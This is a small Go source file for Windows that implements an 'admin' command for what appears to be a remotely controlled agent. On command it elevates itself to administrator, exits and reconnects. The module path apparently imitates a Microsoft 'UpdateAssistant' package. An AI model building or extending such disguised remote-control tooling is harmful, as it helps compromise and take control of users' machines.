//go:build windows

package system

import (
	"os"

	"github.com/microsoft/UpdateAssistant/modules/ipc"
	"github.com/microsoft/UpdateAssistant/modules/sysutil"
)

var adminUsage = []string{
	"admin — elevate agent to administrator",
	"example: admin",
}

func Admin(c *ipc.Context) error {
	if sysutil.IsAdmin() {
		return c.Reply("already running as administrator")
	}
	if sysutil.ElevateSelf() {
		go os.Exit(0)
		return c.Reply("elevating — reconnecting as administrator")
	}
	return c.ReplyEmbed(ipc.Error("elevation failed or was denied"))
}
